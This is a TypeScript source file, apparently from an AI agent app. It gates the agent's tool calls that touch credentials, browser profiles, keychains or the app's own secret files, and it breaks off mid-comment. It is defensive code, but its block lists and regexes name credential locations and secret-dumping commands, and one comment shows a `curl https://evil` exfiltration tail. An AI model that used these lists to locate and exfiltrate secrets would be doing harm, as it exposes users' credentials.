import { type Dir, promises as fsp } from 'fs'
import { homedir } from 'os'
import { basename, dirname, isAbsolute, join, resolve, sep } from 'path'
import { fileURLToPath } from 'url'

import { LAN_SERVER_PORT, SERVER_PORT } from '@exodus/shared/constants/systems'
import { TOOL_NAMES } from '@exodus/shared/constants/tool-names'

import { GREP_SKIP_DIRS } from '../calling-tools/grep-skip-dirs'

/**
 * The approval gate for secrets outside Actovia (spec 2026-09-25 §2.5).
 *
 * Actovia's own secrets are defended without exception elsewhere (encrypted at
 * rest, masked by the API). Secrets elsewhere on the machine — SSH keys, cloud
 * credentials, `.env` files — are sometimes exactly what a task needs, so a
 * tool call that touches one is paused and the user decides: `sensitiveTarget`
 * says which calls, `pending-approvals.ts` holds each paused call until a decision
 * (`POST /api/v1/chat/approval`), a timeout or Stop settles it.
 *
 * Some of Actovia's own files are never the user's decision, and a call that
 * touches them is refused without asking: `~/.exodus/lock.dat` (the PIN
 * secret), `~/.exodus/tls/` (the LAN certificate's key), and the raw data —
 * `~/.exodus/database` (PGlite), `~/.exodus/backups` (its archives) and
 * `~/.exodus/analytics` (the DuckDB copy). Those last three are ciphertext
 * only while encryption at rest is on: a backup written before it existed,
 * and every file while `safeStorage` is unavailable, holds keys in plaintext
 * — and no tool has a use for raw database files (chats are read through
 * `lcm_*`). The rest of `~/.exodus` (the chat workspaces, media, logs) stays
 * readable.
 *
 * The terminal rule is a documented heuristic, not a shell parser: a command
 * that names a sensitive path (`cat ~/.ssh/id_rsa`, `cd ~/.aws && cat
 * credentials`), reads the keychain or a CLI's stored token (`security
 * find-generic-password`, `gh auth token`), or lists other processes'
 * arguments (`ps -axo args` — an MCP server started with `--api-key …` shows
 * it there) is gated. An obfuscated command gets past it; one that merely
 * mentions `.ssh` in an `echo` is asked about (an accepted false positive).
 *
 * `call_mcp_tool` is gated the same way: every string in its `arguments` is
 * checked as a path and as a command, and a URL at Actovia's own API ports is
 * refused — an MCP filesystem or fetch server is otherwise a side door past
 * both rules.
 */

export type SensitiveKind = 'ask' | 'refuse'

export interface SensitiveTarget {
  /** `ask`: pause for the user. `refuse`: blocked outright, nothing asked. */
  kind: SensitiveKind
  /** What the call touches — a path (home as `~`) or the command. Never contents. */
  summary: string
}

export interface MatchEnv {
  home: string
  exodusHome: string
  /** Where a relative path given to a file tool lands (the process's cwd). */
  cwd: string
  /**
   * Whether the filesystem ignores case — macOS's (and Windows') default
   * does, so `~/.SSH/id_rsa` opens `~/.ssh/id_rsa` and must match it.
   * Defaults to the platform.
   */
  caseInsensitive?: boolean
}

function defaultEnv(): MatchEnv {
  const home = homedir()
  return {
    home,
    exodusHome: process.env.EXODUS_HOME || join(home, '.exodus'),
    cwd: process.cwd()
  }
}

/**
 * The two bounds a summary is held to, applied at two different points
 * (re-review I1): `EVENT_SUMMARY_MAX` is what `sensitiveTarget()` caps the
 * text at for the `approval_required` event — generous, so the person
 * approving sees the part of a long command that matters, wherever it
 * falls; `MODEL_SUMMARY_MAX` is the short bound applied only to the text the
 * *model* reads back (`declinedReason`, `refusedReason`,
 * `groupRefusedReason`) — it has no card to scroll, so its copy of the
 * summary stays terse. Cutting the model-facing copy short never hides
 * anything from the person: the card already showed the full (or
 * `EVENT_SUMMARY_MAX`-capped) text before the model's declined-access
 * result is even generated.
 */
const EVENT_SUMMARY_MAX = 8000
const MODEL_SUMMARY_MAX = 300

/** Directories (and single files) under home whose contents are credentials. */
const HOME_SECRET_ROOTS = [
  '.ssh',
  '.aws',
  '.gnupg',
  '.kube',
  join('.docker', 'config.json'),
  '.netrc',
  join('Library', 'Keychains'),
  // Package-registry and VCS tokens.
  '.npmrc',
  '.yarnrc.yml',
  '.pypirc',
  '.git-credentials',
  '.vault-token',
  // Cloud and CLI credential stores.
  '.azure',
  join('.config', 'gh'),
  join('.config', 'gcloud'),
  join('.config', 'op'),
  '.password-store',
  // Database, storage and package-publishing credentials (re-review m4).
  '.pgpass',
  '.my.cnf',
  '.s3cfg',
  '.boto',
  join('.gem', 'credentials'),
  join('.m2', 'settings.xml'),
  join('.config', 'hub'),
  join('.config', 'rclone', 'rclone.conf'),
  join('.local', 'share', 'keyrings'),
  // Browser profiles: saved passwords (`Login Data`, Firefox's `logins.json`
  // + `key4.db`, readable without a primary password) and cookies.
  join('Library', 'Application Support', 'Google', 'Chrome'),
  join('Library', 'Application Support', 'Google', 'Chrome Beta'),
  join('Library', 'Application Support', 'Google', 'Chrome Canary'),
  join('Library', 'Application Support', 'Google', 'Chrome Dev'),
  join('Library', 'Application Support', 'Vivaldi'),
  join('Library', 'Application Support', 'com.operasoftware.Opera'),
  join('Library', 'Application Support', 'Chromium'),
  join('Library', 'Application Support', 'BraveSoftware'),
  join('Library', 'Application Support', 'Microsoft Edge'),
  join('Library', 'Application Support', 'Firefox'),
  join('Library', 'Application Support', 'Arc'),
  join('Library', 'Cookies'),
  '.mozilla',
  join('.config', 'google-chrome'),
  join('.config', 'chromium'),
  join('.config', 'BraveSoftware'),
  join('.config', 'microsoft-edge'),
  join('.config', 'google-chrome-beta'),
  join('.config', 'google-chrome-unstable'),
  join('.config', 'vivaldi'),
  join('.config', 'opera')
]

/**
 * Directories under home where any file with `credentials` in its name is one
 * (`~/.config/gcloud/application_default_credentials.json`,
 * `~/.cargo/credentials.toml`, `~/.terraform.d/credentials.tfrc.json`).
 */
const HOME_CREDENTIAL_NAME_DIRS = ['.config', '.cargo', '.terraform.d']

/** Actovia's own files no tool ever touches (relative to `~/.exodus`). */
const EXODUS_REFUSED = ['lock.dat', 'tls', 'database', 'backups', 'analytics']

/** Keychains outside home. */
const SYSTEM_SECRET_ROOTS = ['/Library/Keychains', '/System/Library/Keychains']

/**
 * A trailing marker that turns a secret-shaped name into a template/example
 * file, never itself a secret: `.env.example`, `.env.sample`, `.env.template`,
 * `.env.dist`, `id_rsa.example`, `server.key.template`, …
 */
const TEMPLATE_SUFFIXES = ['.example', '.sample', '.template', '.dist']

/**
 * A trailing marker that leaves a secret a secret: a backup copy of a key
 * (`server.pem.bak`, `id_rsa.old`, `tls.key~`) holds the same key.
 */
const BACKUP_SUFFIXES = ['.bak', '.old', '.orig', '.backup', '.save', '~']

function withoutBackupSuffixes(lower: string): string {
  let name = lower
  for (;;) {
    const suffix = BACKUP_SUFFIXES.find(
      (s) => name.endsWith(s) && name.length > s.length
    )
    if (!suffix) return name
    name = name.slice(0, -suffix.length)
  }
}

/** A file whose name alone says it holds a secret — gated outside the workspace. */
function isSecretFileName(name: string): boolean {
  const lower = withoutBackupSuffixes(name.toLowerCase())
  if (TEMPLATE_SUFFIXES.some((s) => lower.endsWith(s))) return false
  return (
    lower.startsWith('.env') ||
    lower.endsWith('.pem') ||
    lower.endsWith('.key') ||
    lower.startsWith('id_') ||
    lower === '.git-credentials' ||
    lower === '.vault-token'
  )
}

/**
 * From `MatchEnv.caseInsensitive`, defaulting to the platform. Threaded
 * through every call explicitly (never shared module state): the matcher
 * runs with real `await`s now (the grep tree scan), so two calls can be in
 * flight together — a mutable module-level flag would let one call's
 * case-folding leak into another's.
 */
function foldCaseOf(env: MatchEnv): boolean {
  return (
    env.caseInsensitive ??
    (process.platform === 'darwin' || process.platform === 'win32')
  )
}

/** macOS firmlinks: `/System/Volumes/Data/Users/…` is `/Users/…`. */
const FIRMLINK_PREFIX = '/System/Volumes/Data/'

/** The form paths are compared in: firmlink prefix dropped, case folded
 *  where the filesystem ignores it. Never shown to anyone. */
function canon(path: string, env: MatchEnv): string {
  const unlinked = path.startsWith(FIRMLINK_PREFIX)
    ? path.slice(FIRMLINK_PREFIX.length - 1)
    : path
  return foldCaseOf(env) ? unlinked.toLowerCase() : unlinked
}

function isWithin(child: string, parent: string, env: MatchEnv): boolean {
  const c = canon(child, env)
  const p = canon(parent, env)
  return c === p || c.startsWith(p.endsWith(sep) ? p : p + sep)
}

/**
 * How long one path's symlink resolution may take. `realpath` on an
 * unresponsive network mount can block far longer; every resolution is async
 * and raced against this, and a path still unresolved when it passes is asked
 * about (S6 minor) — never waited on, which would hold `beforeToolCall` (and
 * the HTTP server, IPC, every other run's SSE) behind the mount.
 *
 * Per path, not per call (re-review m6): `call_mcp_tool` walks its leaves one
 * after another, and under one shared 250 ms budget every leaf after the
 * first quarter-second read as "not checked in time" on a merely busy
 * machine. `CALL_DEADLINE_MS` still bounds the call as a whole, so a string
 * of slow paths cannot hold the gate for leaves × 250 ms.
 */
const RESOLVE_DEADLINE_MS = 250
const CALL_DEADLINE_MS = 3000
const TIMED_OUT = Symbol('timed-out')

/** A path and its symlink-resolved form, and whether resolving it timed out. */
interface PathForms {
  forms: string[]
  unchecked: boolean
}

/**
 * Symlink resolution for one `sensitiveTarget` call: memoized, async, each
 * path bounded by its own deadline and all of them by the call's. A path
 * under a network root is never resolved at all (`realpath` itself can hang
 * there).
 */
class PathResolver {
  private readonly cache = new Map<string, Promise<string | typeof TIMED_OUT>>()
  private readonly deadline: Promise<typeof TIMED_OUT>
  private readonly timers = new Set<ReturnType<typeof setTimeout>>()

  constructor(
    private readonly env: MatchEnv,
    private readonly pathMs = RESOLVE_DEADLINE_MS,
    callMs = CALL_DEADLINE_MS
  ) {
    this.deadline = this.after(callMs)
  }

  private after(ms: number): Promise<typeof TIMED_OUT> {
    return new Promise((settle) => {
      const timer = setTimeout(() => {
        this.timers.delete(timer)
        settle(TIMED_OUT)
      }, ms)
      timer.unref?.()
      this.timers.add(timer)
    })
  }

  dispose(): void {
    for (const timer of this.timers) clearTimeout(timer)
    this.timers.clear()
  }

  /**
   * The path with every symlink resolved — of the path itself when it
   * exists, else of its nearest existing ancestor (so a new file under a
   * symlinked directory still resolves) — or `TIMED_OUT`. Never throws.
   */
  real(path: string): Promise<string | typeof TIMED_OUT> {
    if (isNetworkRoot(path, this.env)) return Promise.resolve(path)
    let hit = this.cache.get(path)
    if (!hit) {
      hit = this.resolve(path)
      this.cache.set(path, hit)
    }
    return hit
  }

  private async resolve(path: string): Promise<string | typeof TIMED_OUT> {
    const own = this.after(this.pathMs)
    let current = path
    const rest: string[] = []
    for (;;) {
      const attempt = fsp.realpath(current).then(
        (value) => ({ ok: true as const, value }),
        () => ({ ok: false as const })
      )
      const r = await Promise.race([attempt, own, this.deadline])
      if (r === TIMED_OUT) return TIMED_OUT
      if (r.ok) return join(r.value, ...rest)
      const parent = dirname(current)
      if (parent === current) return path
      rest.unshift(basename(current))
      current = parent
    }
  }

  /** A path and its symlink-resolved form (one entry when they agree). */
  async forms(path: string): Promise<PathForms> {
    const real = await this.real(path)
    if (real === TIMED_OUT) return { forms: [path], unchecked: true }
    return { forms: real === path ? [path] : [path, real], unchecked: false }
  }

  /** `forms` for a root: a root not resolved in time is used as written. */
  async rootForms(path: string): Promise<string[]> {
    return (await this.forms(path)).forms
  }
}

function expandHome(path: string, home: string): string {
  if (path === '~') return home
  if (path.startsWith('~/')) return join(home, path.slice(2))
  const m = /^(\$HOME|\$\{HOME\})(\/.*)?$/u.exec(path)
  if (m) return join(home, m[2] ?? '')
  return path
}

function display(path: string, env: MatchEnv): string {
  const { home } = env
  const shown = path.startsWith(FIRMLINK_PREFIX)
    ? path.slice(FIRMLINK_PREFIX.length - 1)
    : path
  return isWithin(shown, home, env) && canon(shown, env) !== canon(home, env)
    ? `~${shown.slice(home.length)}`
    : shown
}

interface Roots {
  resolver: PathResolver
  refused: string[]
  secret: string[]
  /** Where a file named `*credentials*` is one. */
  credentialDirs: string[]
  /** `~/.exodus` itself — a copy of all of it copies the database. */
  exodusHome: string[]
  workspace: string[]
}

async function rootsOf(
  env: MatchEnv,
  workspaceDir: string | undefined,
  resolver: PathResolver
): Promise<Roots> {
  const all = async (paths: string[]) =>
    (await Promise.all(paths.map((p) => resolver.rootForms(p)))).flat()
  const [refused, secret, credentialDirs, workspace, exodusHome] =
    await Promise.all([
      all(EXODUS_REFUSED.map((r) => join(env.exodusHome, r))),
      all([
        ...HOME_SECRET_ROOTS.map((r) => join(env.home, r)),
        ...SYSTEM_SECRET_ROOTS
      ]),
      all(HOME_CREDENTIAL_NAME_DIRS.map((r) => join(env.home, r))),
      workspaceDir ? all([resolve(workspaceDir)]) : Promise.resolve([]),
      all([env.exodusHome])
    ])
  return {
    resolver,
    refused,
    secret,
    credentialDirs,
    exodusHome,
    workspace
  }
}

/** A `*credentials*` file under `~/.config`, `~/.cargo` or `~/.terraform.d`. */
function isCredentialNamed(path: string, roots: Roots, env: MatchEnv): boolean {
  return (
    withoutBackupSuffixes(basename(path).toLowerCase()).includes(
      'credentials'
    ) && roots.credentialDirs.some((r) => isWithin(path, r, env))
  )
}

/**
 * How one absolute path is classified: `refuse` (Actovia's own lock/TLS
 * secrets), `ask` (a credential location, or a secret-named file outside the
 * workspace), or null. Both the path as written and its symlink-resolved form
 * are checked, so a link in the workspace pointing at `~/.ssh/id_rsa` is
 * caught, and a real `.env` in the workspace is not.
 */
async function classifyPath(
  path: string,
  roots: Roots,
  env: MatchEnv,
  opts: { recursive?: boolean } = {}
): Promise<{ kind: SensitiveKind; via: string; unchecked?: boolean } | null> {
  const { forms: candidates, unchecked } = await roots.resolver.forms(path)
  const refused = candidates.find((p) =>
    roots.refused.some((r) => isWithin(p, r, env))
  )
  if (refused) return { kind: 'refuse', via: refused }
  for (const p of candidates) {
    const ask = { kind: 'ask' as const, via: p }
    if (roots.secret.some((r) => isWithin(p, r, env))) return ask
    if (isCredentialNamed(p, roots, env)) return ask
    if (/\.keychain(-db)?$/iu.test(p)) return ask
    const inWorkspace = roots.workspace.some((w) => isWithin(p, w, env))
    if (!inWorkspace && isSecretFileName(basename(p))) return ask
    // A recursive read (grep) of a directory that contains a credential
    // location reads that location too.
    if (
      opts.recursive &&
      [...roots.secret, ...roots.refused].some((r) => isWithin(r, p, env))
    ) {
      return ask
    }
  }
  // Where it really points could not be told in time: asked about, never
  // waited on (fail closed).
  if (unchecked) return { kind: 'ask', via: path, unchecked: true }
  return null
}

/** Entries a grep-root scan looks at before it gives up and asks anyway. */
const MAX_SCAN_ENTRIES = 20_000
const TOO_MANY = '\u0000too-many'
/** A mount or cloud-sync root: asked about without ever being read (below). */
const NETWORK_VOLUME = '\u0000network-volume'
/** A tree whose walk failed midway (EIO, a vanished mount): asked about. */
const UNREADABLE = '\u0000unreadable'

/**
 * How long a grep-root scan may run before it gives up and asks anyway. An
 * unresponsive network mount can block a `readdir`/`lstat` syscall for far
 * longer than this — the scan is raced against a timer, not just counted, so
 * that a hung mount cannot hang `beforeToolCall` (and with it the HTTP
 * server, IPC and every other run's SSE) past this bound.
 */
const SCAN_DEADLINE_MS = 250

/** Mount points and cloud-sync folders that can hang on an unresponsive
 *  server — asked about without ever touching them (`lstat`/`opendir`
 *  included). Case-folded and firmlink-normalised like every other root. */
function isNetworkRoot(path: string, env: MatchEnv): boolean {
  const roots = [
    '/Volumes',
    '/net',
    '/Network',
    join(env.home, 'Library', 'CloudStorage')
  ]
  return roots.some((r) => isWithin(path, r, env))
}

/**
 * The first file under `root` (not inside the workspace) that the file tools
 * would ask about by name — `.env*`, `*.pem`, `*.key`, `id_*`, a keychain, a
 * `*credentials*` under `~/.config` — or `TOO_MANY` when the tree is too large
 * or slow to tell, or `NETWORK_VOLUME` when `root` is a mount/cloud-sync
 * folder never walked at all. Walks as `grep` does (its skipped directories,
 * depth 8) and, like it, never follows a symlink. Null for a file or a
 * missing root. Every filesystem call is async and raced against
 * `SCAN_DEADLINE_MS`; entries still being read when the deadline wins are
 * closed on a best-effort basis, but the walk itself does not block the
 * caller past the deadline.
 */
async function findSecretInTree(
  root: string,
  roots: Roots,
  env: MatchEnv
): Promise<string | null> {
  if (roots.workspace.some((w) => isWithin(root, w, env))) return null
  if (isNetworkRoot(root, env)) return NETWORK_VOLUME

  let seen = 0
  let deadlineHit = false
  const openDirs = new Set<Dir>()

  const walk = async (dir: string, depth: number): Promise<string | null> => {
    if (deadlineHit) return TOO_MANY
    if (depth > 8) return null
    let handle: Dir
    try {
      handle = await fsp.opendir(dir)
    } catch {
      return null
    }
    if (deadlineHit) {
      handle.close().catch(() => {})
      return TOO_MANY
    }
    openDirs.add(handle)
    try {
      for await (const entry of handle) {
        if (deadlineHit) return TOO_MANY
        if (++seen > MAX_SCAN_ENTRIES) return TOO_MANY
        const full = join(dir, entry.name)
        if (entry.isDirectory()) {
          if (GREP_SKIP_DIRS.has(entry.name)) continue
          if (roots.workspace.some((w) => isWithin(full, w, env))) continue
          const found = await walk(full, depth + 1)
          if (found) return found
        } else if (entry.isFile()) {
          const lower = entry.name.toLowerCase()
          if (
            isSecretFileName(entry.name) ||
            /\.keychain(-db)?$/u.test(lower) ||
            isCredentialNamed(full, roots, env)
          ) {
            return full
          }
        }
      }
    } finally {
      openDirs.delete(handle)
      handle.close().catch(() => {})
    }
    return null
  }

  const scan = async (): Promise<string | null> => {
    let isDir: boolean
    try {
      isDir = (await fsp.lstat(root)).isDirectory()
    } catch {
      return null
    }
    if (!isDir) return null
    try {
      return await walk(root, 0)
    } catch {
      // A read that failed midway (not an unopenable directory, which grep
      // cannot read either): what was left unread is unknown — fail closed.
      return UNREADABLE
    }
  }

  const scanPromise = scan()
  // An abandoned scan (the deadline won the race below) must never surface
  // as an unhandled rejection once it eventually settles.
  scanPromise.catch(() => {})

  let timer: ReturnType<typeof setTimeout> | undefined
  const timeout = new Promise<typeof TOO_MANY>((settle) => {
    timer = setTimeout(() => {
      deadlineHit = true
      settle(TOO_MANY)
    }, SCAN_DEADLINE_MS)
    timer.unref?.()
  })

  try {
    return await Promise.race([scanPromise, timeout])
  } finally {
    clearTimeout(timer)
    if (deadlineHit) {
      // The scan is still running in the background; close whatever it had
      // open at the moment the deadline won so a hung mount's handle does
      // not linger.
      for (const handle of openDirs) handle.close().catch(() => {})
    }
  }
}

const PATH_TOOLS: Record<string, string> = {
  [TOOL_NAMES.readFile]: 'path',
  [TOOL_NAMES.writeFile]: 'path',
  [TOOL_NAMES.editFile]: 'path',
  [TOOL_NAMES.listDirectory]: 'path',
  [TOOL_NAMES.grep]: 'path',
  [TOOL_NAMES.findFiles]: 'searchPath'
}

function stringArg(args: unknown, key: string): string | null {
  if (!args || typeof args !== 'object') return null
  const value = (args as Record<string, unknown>)[key]
  return typeof value === 'string' && value.trim() !== '' ? value : null
}

/** Refuse wins over ask; the first path that decides is the summary. */
function strongest(
  hits: Array<{ kind: SensitiveKind; summary: string }>
): SensitiveTarget | null {
  return hits.find((h) => h.kind === 'refuse') ?? hits[0] ?? null
}

async function matchPathTool(
  toolName: string,
  raw: string,
  roots: Roots,
  env: MatchEnv,
  workspaceDir: string | undefined
): Promise<SensitiveTarget | null> {
  const expanded = expandHome(raw.trim(), env.home)
  // A relative path lands where the process runs (what `fs` does); the
  // workspace is checked too, since that is where the model means it.
  const bases = isAbsolute(expanded)
    ? ['']
    : [env.cwd, ...(workspaceDir ? [workspaceDir] : [])]
  const hits: SensitiveTarget[] = []
  for (const base of bases) {
    const abs = base ? resolve(base, expanded) : resolve(expanded)
    const hit = await classifyPath(abs, roots, env, {
      recursive: toolName === TOOL_NAMES.grep
    })
    if (!hit) {
      // A grep reads every file under its root: a root outside the workspace
      // asks as `read_file` would when the tree holds a secret-named file.
      if (toolName === TOOL_NAMES.grep) {
        // A network root is never resolved (`PathResolver.real`) — realpath
        // can hang on the same unresponsive mount.
        const real = await roots.resolver.real(abs)
        const found =
          real === TIMED_OUT
            ? TOO_MANY
            : await findSecretInTree(real, roots, env)
        if (found) {
          const why =
            found === TOO_MANY
              ? 'too large to check'
              : found === NETWORK_VOLUME
                ? 'on a network or cloud volume, not scanned'
                : found === UNREADABLE
                  ? 'could not be read in full'
                  : display(found, env)
          const suffix =
            found === TOO_MANY ||
            found === NETWORK_VOLUME ||
            found === UNREADABLE
              ? why
              : `contains ${why}`
          hits.push({
            kind: 'ask',
            summary: `${display(abs, env)} (${suffix})`
          })
        }
      }
      continue
    }
    // A link is shown with what it points at — that is what gets read.
    const summary = hit.unchecked
      ? `${display(abs, env)} (not checked in time)`
      : hit.via === abs
        ? display(abs, env)
        : `${display(abs, env)} → ${display(hit.via, env)}`
    hits.push({ kind: hit.kind, summary })
  }
  return strongest(hits)
}

// ── terminal ─────────────────────────────────────────────────────────────────

/** Reading the macOS keychain from the shell. */
const KEYCHAIN_COMMAND =
  /\bsecurity\s+(?:find-[a-z-]*password|dump-keychain|export)\b/u

/** A CLI printing the token it has stored. */
const CREDENTIAL_COMMAND =
  /\b(?:gh\s+auth\s+token|gcloud\s+auth\s+(?:application-default\s+)?print-(?:access|identity)-token|aws\s+configure\s+(?:get|export-credentials)|az\s+account\s+get-access-token|op\s+(?:read|item\s+get)|git\s+credential\s+fill|vault\s+print\s+token|npm\s+token\s+list)\b/u

/**
 * Listing other processes with their arguments or environment: an MCP server
 * started as `… --api-key sk-…` shows the key to `ps -axo args`, and on Linux
 * `/proc/<pid>/environ` shows its environment. Any `ps` with an option (bare
 * `ps` lists only the shell's own terminal), `pgrep` with `a` or `l`
 * anywhere in a flag group (`-a`, `-l`, `-af`, `-lf`), `pstree -a`,
 * `lsof -p`, and `/proc/<pid>/cmdline` or `environ`. A documented heuristic, not a
 * list of every tool that can read a process table.
 */
const PROCESS_ARGS_COMMAND =
  /(?:^|[\s;|&(`/])(ps[ \t]+[^\s;|&)]\S*|pgrep\b[^;|&\n]*[ \t]-[a-z]*[al][a-z]*\b|pstree\b[^;|&\n]*[ \t]-[a-z]*a|lsof\b[^;|&\n]*[ \t]-[a-z]*p)|(\/proc\/[^\s/]+\/(?:cmdline|environ))\b/iu

function processArgsTrigger(command: string): string | undefined {
  const m = PROCESS_ARGS_COMMAND.exec(command)
  return m ? (m[1] ?? m[2]) : undefined
}

/** A credential location named anywhere in a command, however it is spelled. */
const SECRET_MENTION =
  /(?:^|[\s'"=:(/`])(?:\.ssh|\.aws|\.gnupg|\.kube|\.netrc|\.docker\/config\.json|Library\/Keychains|\.npmrc|\.yarnrc\.yml|\.pypirc|\.git-credentials|\.vault-token|\.azure|\.password-store|\.pgpass|\.my\.cnf|\.s3cfg|\.boto|\.gem\/credentials|\.m2\/settings\.xml|\.local\/share\/keyrings|\.mozilla|\.config\/(?:gh|gcloud|op|hub|rclone\/rclone\.conf|google-chrome(?:-beta|-unstable)?|chromium|BraveSoftware|microsoft-edge|vivaldi|opera)|\.cargo\/credentials[\w.-]*|\.terraform\.d\/credentials[\w.-]*|Library\/Cookies|Library\/Application(?:\\?[ \t]|%20)Support\/(?:Google\/Chrome(?:\\?[ \t](?:Beta|Canary|Dev))?|Vivaldi|com\.operasoftware\.Opera|Chromium|BraveSoftware|Microsoft(?:\\?[ \t]|%20)Edge|Firefox|Arc))(?=$|[\s'"/;|&)<>`])/iu

const EXODUS_REFUSED_WORDS = 'lock\\.dat|tls|database|backups|analytics'
const REFUSED_MENTION = new RegExp(
  `\\.exodus\\/(?:${EXODUS_REFUSED_WORDS})(?=$|[\\s'"/;|&)<>\`*])`,
  'iu'
)
/** `cd ~/.exodus && cat lock.dat` — the directory and the file named apart. */
const EXODUS_MENTION = /\.exodus(?=$|[\s'"/;|&)<>`])/iu
const LOCK_OR_TLS_WORD = new RegExp(
  `(?:^|[\\s'"/])(?:${EXODUS_REFUSED_WORDS})(?=$|[\\s'"/;|&)<>\`*])`,
  'iu'
)

const GLOB_CHARS = /[*?[]/u

/** One shell glob segment as a regex (`*`, `?`, `[…]` / `[!…]`). */
function globSegment(segment: string): RegExp {
  let out = ''
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i]!
    if (ch === '*') out += '[^/]*'
    else if (ch === '?') out += '[^/]'
    else if (ch === '[') {
      const end = segment.indexOf(']', i + 2)
      if (end === -1) {
        out += '\\['
        continue
      }
      const body = segment.slice(i + 1, end)
      out += `[${body.startsWith('!') ? `^${body.slice(1)}` : body}]`
      i = end
    } else out += ch.replaceAll(/[.+^${}()|\\\]]/gu, '\\$&')
  }
  return new RegExp(`^${out}$`, 'u')
}

/**
 * Whether a path with glob characters can expand to `root` or into it — a
 * `strings` over `~/.exodus` with a `*` for each level reads the database the
 * literal forms are refused for (re-review m3). Compared segment by segment, case-folded like
 * every other path here; a `**` segment reaches everything below it.
 */
function globReaches(pattern: string, root: string, env: MatchEnv): boolean {
  const pat = canon(pattern, env).split(sep)
  const target = canon(root, env).split(sep)
  for (const [i, want] of target.entries()) {
    const seg = pat[i]
    if (seg === undefined) return false
    if (seg === '**') return true
    if (!GLOB_CHARS.test(seg)) {
      if (seg !== want) return false
      continue
    }
    try {
      if (!globSegment(seg).test(want)) return false
    } catch {
      // A class the regex engine will not take: assume it matches (fail
      // closed).
    }
  }
  return true
}

/** `tar czf out.tgz -C ~ .exodus`: the data directory named on its own. */
const BARE_EXODUS_WORD = /^\.exodus\/?$/iu

/** Paths considered per command — a heredoc script is not walked word by word. */
const MAX_COMMAND_TOKENS = 2000

/** Trimmed only — length is bounded once, centrally, by `capSummary()` in
 *  `sensitiveTarget()`, never here (I1: a per-piece cut this early would
 *  hide whatever of the command falls past it before that central bound
 *  ever gets a chance to attach `truncated` / `hiddenChars` to it). */
function commandText(command: string): string {
  return command.trim()
}

/**
 * The summary of a gated command: what triggered it first — the path or the
 * keychain call — then the full command, untruncated (see `commandText()`).
 */
function withTrigger(trigger: string, command: string): string {
  return `${trigger} — ${commandText(command)}`
}

// ── summary sanitization ───────────────────────────────────────────────────

/**
 * Unicode `Cf` (Format) characters: the bidi embedding/override/isolate
 * controls (U+202A–U+202E, U+2066–U+2069), the bidi marks (U+200E, U+200F,
 * U+061C), the zero-width joiners/spaces (U+200B–U+200D) and byte-order mark
 * (U+FEFF), and every other character in the category. A name like `.env`
 * followed by U+202E (RIGHT-TO-LEFT OVERRIDE) and then `txt.exe` uses one of
 * these to display reversed — stripping the category, not just the
 * well-known members, is what keeps a client from ever rendering the trick.
 */
const FORMAT_CONTROLS = /\p{Cf}/gu

/**
 * `\r\n`, `\r`, `\n`, U+0085 (NEL), U+2028 (LINE SEPARATOR) and U+2029
 * (PARAGRAPH SEPARATOR) — every character Unicode's own line-break class
 * `BK`/`NL` treats as a forced break, not just ASCII's two (re-review N1: a
 * UIKit/AppKit label, an older browser or any other client that honours
 * `Zl`/`Zp`/NEL as a break would otherwise still hide text after one of
 * these the same way a raw `\n` used to). `\r\n` is listed first so a CRLF
 * pair collapses to one `⏎` rather than two.
 */
const LINE_BREAK = /\r\n|[\r\n\u0085\u2028\u2029]/gu

/**
 * Every other C0/C1 control (`\n`, `\r` and `\t` are handled separately,
 * above/below): NUL–BS, VT, FF, SO–US, DEL, and the C1 range.
 */
// oxlint-disable-next-line no-control-regex -- matching control characters is the point.
const OTHER_CONTROLS = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F]/gu

/**
 * Makes a `SensitiveTarget.summary` safe to render as literal text on any
 * client — the desktop approval card, and any other surface (a paired
 * phone) that shows the string as-is. `sensitiveTarget()` is the one place
 * this runs, on its way out, so every caller (`run.ts`'s
 * `approval_required` event and `declinedReason()`, `sensitive-guard.ts`'s
 * `refusedReason()` / `groupRefusedReason()`) already gets sanitized text —
 * no client sanitizes it again, and none should have to.
 *
 * Four rules, in order: strip every Unicode `Cf` character (bidi/format/
 * zero-width controls — a hidden reorder or a hidden run of text); turn
 * every forced line break — `\r\n`, `\r`, `\n`, U+0085 (NEL), U+2028
 * (LINE SEPARATOR), U+2029 (PARAGRAPH SEPARATOR) — into a visible `⏎` and a
 * tab into `⇥` (real ones would hide everything after the first line from a
 * client that renders only that — including a client that honours `Zl`/
 * `Zp`/NEL as a break rather than just ASCII's two, re-review N1); replace
 * any other C0/C1 control with `�`; then, last, well-form the string
 * (`String.prototype.toWellFormed()`, Node 20 / V8 11.0+ — Electron 44
 * comfortably clears both): a path or command a model wrote can carry a
 * lone UTF-16 surrogate (half an intended pair, or a bare
 * U+D800–U+DFFF planted on purpose) that `JSON.stringify` happily encodes
 * as an escape with no matching scalar value — Node's own `JSON.parse`
 * shrugs it back in, but a strict decoder elsewhere (Swift's
 * `JSONDecoder`, building a well-formed-UTF-16-only `String`) rejects the
 * whole payload, not just the field, the instant it hits one. Run last so
 * it sees the final text `capSummary()` will cut, not an intermediate one.
 *
 * Deliberately does *not* bound the length — that used to happen here (cut
 * at 300), which reopened the very hiding problem this function exists to
 * close: a command whose dangerous tail (`… | curl https://evil …`) fell
 * past the cut vanished from the card exactly as a raw `\n` would have
 * (re-review I1). Length is bounded once, centrally, by `capSummary()`,
 * which is why well-forming runs before that cut, not after: `toWellFormed()`
 * only ever replaces a lone surrogate with U+FFFD (never introduces one),
 * so `capSummary()`'s surrogate-pair-aware boundary still sees a
 * well-formed string to cut.
 *
 * A client outside this repo (exodus-ios) that renders its own copy of the
 * summary must apply the same four rules before display.
 */
export function sanitizeSummary(text: string): string {
  return text
    .replaceAll(FORMAT_CONTROLS, '')
    .replaceAll(LINE_BREAK, '⏎')
    .replaceAll('\t', '⇥')
    .replaceAll(OTHER_CONTROLS, '�')
    .toWellFormed()
}

export interface CappedSummary {
  text: string
  truncated: boolean
  /**
   * UTF-16 code units cut off `text` (0 when not `truncated`) — the same
   * unit `maxLength` and `String#length` are counted in; a non-BMP
   * character (an emoji, most CJK-extension-B+ ideographs) is a surrogate
   * pair and so counts as 2, matching `text.length` exactly.
   */
  hiddenChars: number
}

/**
 * Cuts `text` to `maxLength` UTF-16 code units, from the end — the matched
 * trigger always leads a summary (`withTrigger`), so the part that
 * triggered the match is what survives a cut, never what's lost. Used at
 * two different bounds: `EVENT_SUMMARY_MAX` for what the `approval_required`
 * event (and the card) carries, `MODEL_SUMMARY_MAX` for the short copy the
 * declined/refused tool result hands back to the model (`forModel()`,
 * below) — the model has no card to scroll, and by the time it reads that
